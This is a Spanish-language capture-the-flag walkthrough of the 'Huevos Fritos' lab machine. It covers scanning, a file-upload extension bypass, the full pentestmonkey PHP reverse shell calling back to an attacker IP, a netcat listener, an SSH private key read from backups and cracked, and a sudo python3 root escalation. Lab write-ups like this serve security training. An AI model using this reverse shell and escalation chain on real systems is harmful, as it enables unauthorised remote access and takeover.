▶️**Maquina**: Huevos Fritos

▶️**Dificultad**: Avanzado

▶️**Web**: thehackerslabs.com

----------------------------------------------------------------------------------------------------------------------------------------------

**Reconocimiento** 👀

Escaneamos la maquina con Nmap y nos detecta los puertos 80/http y 22/ssh, por lo que procedemos a verificar el sitio web y nos encontramos una pagina por defecto de Apache.

```
nmap -p- --open -sS -sC -sV --min-rate 2500 -n -vvv -Pn 192.168.0.107
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 5f:73:cb:8a:81:c0:0a:11:18:01:39:e0:1e:bf:ed:60 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoN3ijKzJZlVDRiozexMEKpj/uHuv7T1EeCWmONFKnhp91ezxG0C+2rk3mmGoiVIJQC/Kh1YlwSYBZa9auJQCY=
|   256 5c:7d:ee:db:28:56:7c:ef:46:e1:a6:18:c6:03:01:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKZEgMxE7+fTzkBdtWf2cccIZAhGMtgYYuQ9gGdYgtdK
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 08:00:27:30:EA:AA (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Screenshot_3](https://github.com/user-attachments/assets/db1a8b7f-429c-4c6c-8d74-5d34c52afed8)

Hacemos una busqueda de directorios con la herramienta gobuster para encontrar mas información y nos encuentra /squirting donde nos presenta un panel de login y carga de archivos.

```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.0.107 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 278]
/squirting            (Status: 301) [Size: 318] [--> http://192.168.0.107/squirting/]
```

![Captura de pantalla 2024-11-09 160551](https://github.com/user-attachments/assets/60885abb-951c-4789-8ded-08d5c96f3f7d)


Usando las credenciales admin:admin y subiendo un archivo de prueba, verificamos a donde nos redirige y guarda lo que estamos cargando, pues al final del codigo fuente tenemos un directorio oculto **/pantumaca** 

![Captura de pantalla 2024-11-09 161043](https://github.com/user-attachments/assets/fbd374c1-9e21-4332-9ae9-96d12139b56b)

![Captura de pantalla 2024-11-09 161328](https://github.com/user-attachments/assets/46848ed4-bed0-4cb5-964a-4573876d3e84)

![Captura de pantalla 2024-11-09 161410](https://github.com/user-attachments/assets/de9b2ee5-792a-424e-9fbb-71e475aa78b0)


Ahora que sabemos donde se guardan los archivos cargados procedemos a crear una reverse shell

```
nano rev-shell.php
```

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.112';
$port = 5000;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Nos damos cuenta que tenemos que aplicar un bypass para cargar nuestro archivo ya que hay extensiones que no nos permite subir.

![Captura de pantalla 2024-11-09 162046](https://github.com/user-attachments/assets/6171cdd2-7607-425f-8559-448e770dd2f4)

Usaremos burpsuite para probar diferentes extensiones de forma eficiente.

![Captura de pantalla 2024-11-09 171228](https://github.com/user-attachments/assets/6e620460-1983-49e2-b932-08f1c056264c)

Si investigamos en internet las diferentes extensiones de php que podemos utilizar, podemos hacer un pequeño diccionario de extensiones para probar una a una desde el intruder. Luego revisar cuales fueron recibidas por el servidor.

![Captura de pantalla 2024-11-09 171845](https://github.com/user-attachments/assets/1108fb12-65ba-4c9e-b39b-c57fc8203f9a)

![Captura de pantalla 2024-11-09 172123](https://github.com/user-attachments/assets/cd990744-9e4e-40a4-a87b-24d748b896db)

----------------------------------------------------------------------------------------------------------------------------------------------

**Explotación** 🔥

Ahora que sabemos cuales son las extensiones de php que recibe el servidor y haberlas subido con burpsuite, podemos iniciar con la conexión para entrar a la maquina.

Nos ponemos a la escucha.

```
nc -lvnp 5000
```

Hacemos clic en el archivo recibido y obtenemos una shell

![Captura de pantalla 2024-11-09 172602](https://github.com/user-attachments/assets/fa121f90-bf45-4d50-8a8c-a76695af674f)

![Captura de pantalla 2024-11-09 173455](https://github.com/user-attachments/assets/195b3cbe-df88-4df4-9c4b-af859ea59826)

Luego de una busqueda para escalar privilegios encontramos un archivo llamado **.cositas** en /var/backups que contiene el id_rsa del usuario huevosfritos, el cual podemos ver en el /etc/passwd

```
www-data@huevosfritos:/var/backups$ ls -la
total 36
drwxr-xr-x  2 root root  4096 Nov  9 21:23 .
drwxr-xr-x 12 root root  4096 Jun 15 17:37 ..
-rw-r--r--  1 root root  3434 Jun 16 12:32 .cositas
-rw-r--r--  1 root root 16063 Jun 16 12:06 apt.extended_states.0
-rw-r--r--  1 root root   851 Jun 16 11:01 apt.extended_states.1.gz
-rw-r--r--  1 root root   792 Jun 15 17:38 apt.extended_states.2.gz
www-data@huevosfritos:/var/backups$ cat .cositas
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD1RqMErj
q/NVKM18nXgLlUAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQCuyjKx/nBc
tBsV+dTQ1dO7A4HvF5kQzwu++31DcxjoNLgaA5jiuGhzvF1TWCV7BHjUCrZqK+7F+uCWZr
9xv0Ei56dWvPcRuz22+6PT+2nDOhn/XVCEZR83AioEJcM9pWStB5kjGkHkLVkIkmR4Ah3o
mHhruYBvdXgYsHqw77gBWq6a13fnm9Qci3xS2eQORUdIQrdI0WpbLIUg84EVAl0sndnFli
4j+FX50k3+9sA4tNyiLWzjrRy1kIWWKZDtZt8iTo+gzk53lVp46DUfAu/CkaXTo8/3fUg4
uRb0PbGr6akzriIVWVjQ8uM9NAkR8r845Hd5jnI3cHAqPCIePmXas3MURI8KNPSSPZh9N7
NRPXgQMQ6PgT7VD4dM+mjQS1gtRvjnYypB0ifg7bGMbF0vNKWyIRwlmu58YtLXlARvGApS
/fatx1doqM5kR5wjLYbMfWYLf+jDQRGGcOZ15P+2mOxV1erUUnyw/4/aJ4zPeF7bbR8V3F
8EklJuuuze7tKczARxMxya0P6wTGVLLV394Pww9UtC8CgrPQM/TdcNfZiY73R1IxYNuqsR
i+0ndKfqo6Q5q1rwDWDaP5qxlpfDjb8r7sWMZA+ldYFO9ERrjIeTQvaz8RD5KsjLAGVBEN
jPEgzzwk0r0mR4tNgW4gYH/VXXC7fb/+BCViFZd1lZzQAAB1DjFfomiN0A0fuHtTxlTNrn
snNlLxrpe9oadGOgofQcHambannK8YFDk3ikiZOY0OFeWYexBYlvQrc4f0sCRdL+yeOxCs
BZ3pJ8WQk3VKQ3z28rV5d4BbZgqXRLtz5K91UG7glS43S0shiDAHrtFQPPKwQAjOYrUx6m
awx+7fDyEOuZLRzbZihPPX3lwHuC3kdh+/kYoAorJU+QQrbReRV3IYEvUjVRt+oXOfWbvc
hJpqDE5EhskClIgkOQgbXo5q6rVH+OANJh8Z1Yrf4ZkdQuJoNhKU/zF2nzu41479KMI/zH
jP3f+LKa3HKV/Ac36gIh5KOeGz0ISUfvGcCXOYx0DYo7RSIyXOJf/0a0JB9O9IIVOjKvDp
kvoj9E3NzoOayyIBYr6OhJaQVVzdXbH42srxrtcZHEfTUaqNRA7BnVu+SvKYAwB7szs7pe
dYC2yhaika4T/AlUCot32XwoP0IjLW4/ZGUb+KiwSV/EnaQMBiFdS12jJmbbA+WT+fmKVd
fkYmnWYVBnMsE+evEOQ56eTZCChePXN44Vut42I4W09wt4YmPNDoRMjM6TtfF7sIIVgsQC
smgodOmn0j2SOht3VftIZ6MxkPY5bzcBFHa3Kciq1gaqrrbKo195wrx5J6GfPPELppFGgW
VwSublONtD6Kh2kJMIAPEXXWEQYO8iFrt2W0VHOo3HRQ+jBA5pMNEdSydzdfrxGmEhRSbs
WsqhNoyXiSy6VctTI7BhrHLDVPwEbaSIlUuWQSBEK5kkKu00fMX/n7imPGNfIjYShHwtdC
q76E+L7qDDPC99ODzf0z6j3lmtqghjKrDg8zDMZ96zJA4uXFp4QsVlt1msYYU6TJ7EocVr
0+FSk4HAeUNEK7IHA8GZg4pKsLw+lDOiK5Q6KqIt5HNJuAp2wBd6yeFw9Cu4tcfyS8hgFu
QDAEr9ZN7bqYj9IDJDySfIe8akuGeZ9DjQV6mSnRFVOrMbbbbPLm7rxIdouxuNVEHkmjo+
PNXJnoT8nqWr4Wi6lZobpV49gaE3Dga+kzMCoRNvzQFL1WhOk6jDREKXaE4K+IDT2hQQai
UTjIQcUdIHja1XHX4NvjKgi89zFBp/PuQC9s+lvTBYsTIoAMb4oNtTlGmO0hv9edSoaXbW
FPiK41PfpJWD4fL2z17GOjVD130cUSApLGVtUfbKozwvelLY8mpFasFBy0nuUtr9KApAsp
OezV3RsCf56tF7tc/Ohcql7TMmzm1a6OgPEvNpk8pkhKGar2elC9HRwBTV/tIodoHeqKmX
HQKWHnyLChX4nQ+BLCvxzbueHv0guCzuDtl9Pig6Htlb5dSSJw3i/LFR1H0eI0p56hpWPJ
ygpsXJuOne2Ukvh/CMb0t+FDKuJiCaNelKN3deLn+oqgRTFxJ+V+mgftLgczdZ+0YqO4EG
YTLcAhoKqxhj5kRIXuAwD8gsq1h2vRkcCLB4v8+IMSvEkSAbjFYC7ykSrnLVyt0YUlQQBE
8Mv13uhzptqYgtqv5T7PBkIw18hkxqbp1xfsytVNkJR++pihftiaiZMrejoTcAWvIOd7v4
J5RdGclHQV6bJsXXKp0JHUSMV+oWBHLxRTFQtanRS4rK0kLVj3ST4A/DBU8uoADTGFwLnv
vlBd0ZhBKCRAKev3cAhqofwh9npQzRimj1ji4TBdL2x+Dq9feAcAcI+u5o50OLIxJMOGw6
O1D9fFStl7JNYbkNUvtzPpMFndFJ6artNFsxRkaCK7VjBjcIyGuK+MQMRluqzl+GqipXzt
sdbd2METqNfzzs2tTXpTTyuozokKj+JS2sTG9GaKNIuVIdlitZM/zR9tw/sIneXO33wmrH
92YhuGdDuO1LnwbVYXfLO3bb1DWC/IAG1G9M5cg0ZuNrRqIWyIp+IR17QVKYMBj44WZBtI
JUsVNI9BzndstVJ+KCBzCI+m2DXiQf9ZrGf8jFfnWd+0dBUqhxl92OKGx9FnKLqZfl9OBP
jj3VtVTX+yzfPl1yf4dSNl0BG+gsy1SaQ37V8ThT0WBFZrcbeiu59umFDgrOooLXj2Hv43
Gs2eM5jkJN3JacFrZEIemBk8UCuDaHfh1aSoqof1lF8B/BTrVoreEXtD/icG6DPGBBo8Ec
2s3Z19zdCc+39MykwfWYwIlNO2zAVD/fHogfzZwFXIEe/SEVl9k+t+iTBMhysYUUHiHgoJ
ntzHqG66cRAUwxSn4v5XKNGjlj9rgWh1sKUNYseNW6L2jR0CMpmJG9rLq4mzt+Chmiw4JD
NysUZtVVHAsDKO0VsjkWeD+S7a3o41Z5fer/u8Ov7HcnMntWXfeWTpmcIDky8WGhoLZH8f
v5cNc4gvFCjbHbJb6PBe4QxizXFH9V/u5UvL1t37tU3yh9hJLMIVgVlBvFcWcCzmmsTyqf
cykfeyEmKJpuQ9jLbJbJtJQjQyioWBvFFyTi4V0Dcn/r97NaKlhPoiiJN3S4LLG4doKZyo
6iQ+3DsGiYinW5XOh3+UbXt3Q=
-----END OPENSSH PRIVATE KEY-----
www-data@huevosfritos:/var/backups$
```

```
www-data@huevosfritos:/var/backups$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
huevosfritos:x:1001:1001::/home/huevosfritos:/bin/bash
www-data@huevosfritos:/var/backups$
```

Intentamos acceder mediante SSH pero el id_rsa necesita una contraseña.

![Captura de pantalla 2024-11-09 174330](https://github.com/user-attachments/assets/543149ee-f6cb-4485-a40d-6ec479388d25)

Vamos a descifrar la contraseña con John y ahora si acceder por SSH

![Captura de pantalla 2024-11-09 174842](https://github.com/user-attachments/assets/ef0b68d2-72f4-42b8-a031-546c4ec3e7f1)

Siendo el usuario huevosfritos podemos leer user.txt.

![Captura de pantalla 2024-11-09 175303](https://github.com/user-attachments/assets/d512b364-b209-47b3-9023-e37d84f31637)

Con el comando **sudo -l** podemos ejecutar comandos de python como root.

Seguimos las indicaciones de GTFObins.

![Captura de pantalla 2024-11-09 175525](https://github.com/user-attachments/assets/cc8a7c76-c8a3-4e70-a08c-21152293a3c5)

```
sudo -u root /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```

![Captura de pantalla 2024-11-09 175819](https://github.com/user-attachments/assets/bcf00681-e5ef-4500-8573-5e026dc25783)

Y con esto podemos leer root.txt

Maquina terminada 🥳✅
